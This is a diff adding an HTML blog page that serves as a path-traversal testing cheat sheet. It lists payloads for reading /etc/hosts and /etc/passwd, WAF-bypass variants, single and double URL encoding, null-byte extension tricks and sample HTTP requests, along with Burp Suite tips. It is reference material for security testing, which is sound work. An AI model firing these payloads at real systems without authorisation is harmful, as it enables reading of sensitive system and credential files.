@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Mi Blog</title>
+  <link rel="stylesheet" href="file:///Users/b0ydc/Documents/CYBER/SITE/css/styles.css">
+</head>
+<body>
+  <header>
+    <h4 align="right">@b0ydC</h4>
+  </header>
+
+  <main>
+    <article>
+     
+<h2>1. GENERAL COMMANDS</h2>  
+
+<code>
+
+INFO:  Collection of commands to use when testing for path/directory traversal.<br><br>
+
+C1: ../../../../etc/hosts<br>
+C2: 3-1 METHOD ..././..././..././..././..././..././..././..././etc/hosts | non-recursively<br>
+C3: /etc/hosts | absolute path bypass<br><br>
+  
+Try: <br><br>
+
+* Nullbyte | %00<br>
+* Encoding<br> 
+* Double Encoding<br> 
+* UTF-8 Encoding<br><br>
+
+WAF bypass<br><br>
+
+C4: ..././etc/hosts<br>
+C5: ..;/etc/hosts<br>
+
+</code>          
+
+<h2>2. URL-DECODING</h2> 
+
+<code>
+
+NOTE:<br> <br>
+- It is important to encode one, two, three times, it will be slow but it is important to test if exist any encoding that can be 
+used to bypass the control. [burpsuite > crtl + u (encode) | ctrl + shift + u (decode)]<br><br>
+
+SAMPLES:<br><br>
+
+encoded 1 time<br><br>
+
+C1: ..%2f..%2f..%2fetc/hosts<br><br>
+  
+encoded 2 times<br><br>
+
+C2: ..%252f..%252f..%252fetc/hosts
+
+</code>
+
+<h2>3. VALIDATIONS</h2>  
+
+<u>SPECIFIC PATHS</u><br><br>
+
+<code>
+
+SAMPLE:<br><br>
+
+GET /image?filename=/var/www/img/24.jpg HTTP/2<br>
+Host: machetevault.github.io<br>
+Cookie: session=j5QWoOCqRn5B2jGgronDtpWr6Vz055yb<br><br>
+
+NOTE:<br> <br>
+- Sometimes exist some kind of validations as countermeasure to avoid path traversal. Maybe it is expecting same path and is 
+only validating that, so, attempts can be executed. [absolute, encoded, non-recursive, etc.]<br><br>
+
+SAMPLE: GET /image?filename=/var/www/images/../../../etc/passwd <br><br>
+  
+C1: ../../../../etc/hosts<br><br>
+
+<u>FILE EXTENSION</u><br><br>
+
+NOTE: <br><br>
+  
+1. If it is validating the extension, it will be needed to intercept the request > send request to repeater and change the extension.<br>
+2. Check headers to see if there's some place providing what it is accepting.<br><br>
+
+<u>NULL VALIDATION</u><br><br>
+
+You can use the value %00 to test for null validation. Sometimes you can find that vulnerability when the application is retrieving 
+images, files and more. 
+
+SAMPLE: GET /image?filename=../../../etc/hosts%00.png HTTP/2<br><br>
+
+</code>     
+
+<code>
+
+NOTE:  <br><br>
+1. All can be tested with 1, 2, or any segments [../] as needed all applications will behave different. If needed, SNIPER ATTACK! 
+(or similar). Also, invert the symbol, use backslash and try it. ["..&bsol;&quot;]<br>
+
+2. It is good to enable all columns in burpsuite to see the entire picture. [MIME Type Filters]<br><br>
+
+CHECK THE FOLLOWING LINK, >>> FILE SYSTEM >>> It can be used to check valuable files per OS. 
+
+</code>
+    </article>
+  </main>
+
+</body>
+</html>
